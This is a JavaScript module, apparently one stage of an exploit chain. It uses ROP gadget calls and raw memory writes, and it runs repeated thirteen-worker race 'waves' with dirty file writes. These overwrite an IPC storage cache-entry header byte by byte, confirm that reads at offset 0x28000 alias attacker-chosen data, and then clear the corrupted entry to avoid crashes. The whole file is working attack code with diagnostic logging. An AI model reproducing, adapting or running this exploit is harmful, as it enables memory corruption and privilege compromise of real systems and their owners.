import coreRuntime from "../runtime.mjs";
import {formatWaveSummaryLine, readHexBytes} from "./util.mjs";
import {
  analyzeWave,
  configurePayload,
  nulWrites
} from "./wave.mjs";

const {
  GADGET_MEMSET,
  allocPage,
  call_rop,
  closeReservationGroup,
  executeWave,
  frameArgSlot,
  hex32,
  ipcStorageRead,
  log,
  openReservationGroup,
  prepPacket,
  resetWaveState,
  roleSendCode,
  write32,
  write64,
  write8,
  writeDirtyData
} = coreRuntime;

// ── Cache header installation and retirement ──────────────────────────────

export async function installAddressHeader(input) {
    const config = input.config;
    let desiredBytes = input.desiredBytes;
    let stageName = input.stageName;
    let REQ = input.REQ;
    let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
    let copyWavesTotal = input.copyWavesTotal;
    let dirtyFilePath = input.dirtyFilePath;
    let dirtyWriteBuf = input.dirtyWriteBuf;
    let dirtyWritePkt = input.dirtyWritePkt;
    let gates = input.gates;
    let pinPkt = input.pinPkt;
    let pktBuf = input.pktBuf;
    let rawScheduling = input.rawScheduling;
    let rootSession = input.rootSession;
    let savedHandle = input.savedHandle;
    let sendIndices = input.sendIndices;
    let triggerHandle = input.triggerHandle;
    let waveData = input.waveData;
    let waveExtra = input.waveExtra;
    let wavesJoined = input.wavesJoined;
    let wavesStarted = input.wavesStarted;
    let workerResources = input.workerResources;
    let workerStateSafe = input.workerStateSafe;
    let fragmentBufs = input.fragmentBufs;
    let triggerBuf = input.triggerBuf;
    let analysis = input.analysis;
    const addressCopyInputs = {...input};
    delete addressCopyInputs.desiredBytes;
    delete addressCopyInputs.stageName;
    const copyResult = (ok) => ({ok, addressCopy: {
        ...addressCopyInputs,
        candidateCacheNeedsRetirement,
        copyWavesTotal,
        wavesJoined,
        wavesStarted,
        workerStateSafe,
        analysis
    }});
    stageName = stageName || "cache-address";
    var padded = desiredBytes.slice();
    if (padded.length === 0 || padded[padded.length - 1] !== 0) padded.push(0);
    var steps;
    try { steps = nulWrites(padded); }
    catch (error) {
        await log(stageName + " copy planning failed: " + error.message);
        return copyResult(false);
    }
    if (!steps.length) return copyResult(false);

    for (var stepIdx = 0; stepIdx < steps.length; stepIdx++) {
        var step = steps[stepIdx];
        var confirmed = false;
        var addrAttempts = 0;
        var addrWinFail = 0, addrPreLow = 0, addrPathMiss = 0;
        for (var batch = 0; batch < config.COPY_BATCHES && !confirmed; batch++) {
        for (var attempt = 0; attempt < config.MAX_COPY_ATTEMPTS; attempt++) {
            addrAttempts++;
            if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                    dirtyWriteBuf, dirtyWritePkt)) {
                await log(stageName + " copy failed: dirty write");
                return copyResult(false);
            }

            resetWaveState(waveData.frames, waveData.backups, REQ,
                waveData.pktBackups, gates, waveExtra);
            var payloadSetup = configurePayload(step.bytes,
                {config, REQ, fragmentBufs, triggerBuf});
            if (!payloadSetup.configured) return copyResult(false);
            var group = openReservationGroup(rootSession, pktBuf, 59);
            if (!group.ok) {
                await log(stageName + " copy failed: reservation group");
                return copyResult(false);
            }

            prepPacket(REQ[9], 4, 8, []);
            write8(REQ[9] + 0x10n, 2n);
            write32(REQ[9] + 0x14n, BigInt(group.outer));
            write32(REQ[9] + 0x1Cn, 0n);
            write64(frameArgSlot(waveData.frames[9].frame,
                waveData.frames[9].count, sendIndices[9], 0),
                BigInt(group.session));
            write64(frameArgSlot(waveData.frames[12].frame,
                waveData.frames[12].count, sendIndices[12], 0),
                BigInt(triggerHandle));
            write32(pinPkt + 0x18n, 1009n);

            var wave = executeWave(waveData.frames, rawScheduling,
                workerResources, gates, sendIndices);
            wavesStarted += wave.started === 13 ? 1 : 0;
            if (wave.created < 13 || wave.started < 13) {
                var releaseCode = roleSendCode(waveData.frames, 9,
                    sendIndices[9]);
                closeReservationGroup(group,
                    wave.created < 13 || releaseCode !== 0, pktBuf);
                workerStateSafe = wave.workerStateSafe === true;
                await log(stageName + " copy failed: workers=" + wave.created +
                    "/" + wave.started + " joined=" + wave.joined);
                return copyResult(false);
            }
            if (wave.joined < 13) {
                workerStateSafe = false;
                await log(stageName + " copy failed: workers did not join");
                return copyResult(false);
            }
            wavesJoined++;

            var result = analyzeWave(stageName,
                wave, waveData, group, false, analysis);
            analysis = {...analysis, pinHandle: result.pinHandle,
                pinFirstWaveQualified: result.pinFirstWaveQualified};
            var releaseWasSent = roleSendCode(waveData.frames, 9,
                sendIndices[9]) === 0;
            closeReservationGroup(group, !releaseWasSent, pktBuf);
            copyWavesTotal++;

            var accepted = result.window && result.preReleaseUsed !== null &&
                result.preReleaseUsed >= config.FIELD_MINIMUM_CACHE_HELD &&
                result.changedPaths.length === 0;
            await log(formatWaveSummaryLine(copyWavesTotal, stageName,
                result, accepted ? "header copy accepted" : "header copy rejected",
                {config}));
            if (!accepted) {
                if (!result.window) addrWinFail++;
                else if (result.preReleaseUsed === null ||
                         result.preReleaseUsed < config.FIELD_MINIMUM_CACHE_HELD)
                    addrPreLow++;
                else addrPathMiss++;
            }
            if (accepted) {
                candidateCacheNeedsRetirement = true;
                confirmed = true;
                break;
            }
        }
        }
        if (confirmed) {
            await log("  " + stageName + " step " + stepIdx +
                " OK (att=" + addrAttempts + ")");
            // Let the accepted wave and step summary reach the host before
            // starting another cache-address step or the verification reads.
        } else {
            await log("  " + stageName + " step " + stepIdx + " FAIL att=" + addrAttempts +
                " winFail=" + addrWinFail + " preLow=" + addrPreLow +
                " pathMiss=" + addrPathMiss);
        }
        if (!confirmed) return copyResult(false);
    }
    return copyResult(true);
}

export async function qualifyCacheBucketPeriod(input) {
    let candidateHandle = input.candidateHandle;
    let primeHex = input.primeHex;
    let storageHandle = input.storageHandle;
    let addressCopy = input.addressCopy;
    var controlBuf = allocPage(0x1000);
    call_rop(GADGET_MEMSET, controlBuf, 0xA5n, 16n);
    var control = ipcStorageRead(storageHandle, 0x28000, 16, controlBuf);
    var controlHex = control.error === 0 ? readHexBytes(controlBuf, 16) : "";
    await log("PERIOD: ordinary @0x28000=" +
        hex32(control.error) + (controlHex ? " data=" + controlHex : "") +
        " matches-prefix=" + (controlHex === primeHex));
    if (control.error !== 0) {
        await log("PERIOD: ordinary content control failed");
        return {ok: false, addressCopy};
    }

    // Match the reference two-copy test: first install the UTF-8 prefix,
    // then place a NUL in byte 0 so the signed entry offset becomes 0x28000.
    var prefixCopy = await installAddressHeader({...addressCopy,
        desiredBytes: [0xC2, 0x80, 0x02],
        stageName: "cache-period-prefix"});
    addressCopy = prefixCopy.addressCopy;
    var periodPrefixOk = prefixCopy.ok;
    var periodZeroOk = false;
    if (periodPrefixOk) {
        var zeroCopy = await installAddressHeader({...addressCopy,
            desiredBytes: [], stageName: "cache-period-zero"});
        addressCopy = zeroCopy.addressCopy;
        periodZeroOk = zeroCopy.ok;
    }
    var periodAliasOk = false;
    if (periodZeroOk) {
        var periodBuf = allocPage(0x1000);
        call_rop(GADGET_MEMSET, periodBuf, 0xA5n, 16n);
        var periodRead = ipcStorageRead(candidateHandle, 0x28000, 16, periodBuf);
        var periodHex = periodRead.error === 0
            ? readHexBytes(periodBuf, 16) : "";
        periodAliasOk = periodRead.error === 0 && periodHex === primeHex;
        await log("PERIOD: alias probe=" +
            hex32(periodRead.error) + (periodHex ? " data=" + periodHex : "") +
            " matched=" + periodAliasOk);
    } else {
        await log("PERIOD: offset-copy sequence did not qualify");
    }

    // Leave the candidate in this measured state. The next address-header
    // copy replaces all 0x28 bytes; if planning or copying fails, retirement
    // clears the valid byte before the handle can be closed.
    await log("PERIOD: candidate state=" +
        (periodAliasOk ? "measured alias" : "unqualified; retire only"));
    return {ok: periodAliasOk, addressCopy};
}

export async function retireCandidateCache(input) {
    let candidateCacheNeedsRetirement = input.candidateCacheNeedsRetirement;
    let candidateCacheRetired = input.candidateCacheRetired;
    let candidateHandle = input.candidateHandle;
    let addressCopy = input.addressCopy;
    if (!candidateHandle || !candidateCacheNeedsRetirement)
        return {ok: true, addressCopy: {...addressCopy, candidateCacheRetired}};
    await log("RETIRE: begin; clearing cache-entry valid byte");
    var retireBytes = [];
    for (var i = 0; i < 0x10; i++) retireBytes.push(0x42);
    var retirement = await installAddressHeader({...addressCopy,
        desiredBytes: retireBytes, stageName: "cache-retire"});
    addressCopy = retirement.addressCopy;
    var retired = retirement.ok;
    var readback = null;
    if (!retired && addressCopy.workerStateSafe === true) {
        var baseline = addressCopy.aliasControlHex;
        var aliasBytes = addressCopy.primeHex;
        if (baseline && aliasBytes && baseline !== aliasBytes) {
            // A rejected timing window can still have cleared the valid byte.
            // Only the candidate's original bytes prove that the alias is gone.
            try {
                var verifyBuf = allocPage(0x1000);
                call_rop(GADGET_MEMSET, verifyBuf, 0xA5n, 16n);
                readback = ipcStorageRead(candidateHandle,
                    addressCopy.config.ALIAS_OFFSET, 16, verifyBuf);
                var readbackHex = readback.error === 0
                    ? readHexBytes(verifyBuf, 16) : "";
                retired = readback.error === 0 && readbackHex === baseline;
                await log("RETIRE: readback=" +
                    (retired ? "original content verified" : "unconfirmed") +
                    " read=" + hex32(readback.error) +
                    " stillAliased=" + (readbackHex === aliasBytes));
            } catch (readbackError) {
                await log("RETIRE: readback threw: " +
                    String(readbackError?.message || readbackError));
            }
        } else {
            await log("RETIRE: readback unavailable (distinct baseline missing)");
        }
    }
    if (retired) {
        candidateCacheRetired = true;
        addressCopy = {...addressCopy, candidateCacheRetired};
    }
    await log("RETIRE: " + (retirement.ok
        ? "accepted" : retired ? "verified by readback" : "FAILED"));
    return {ok: retired, addressCopy, candidateCacheRetired};
}
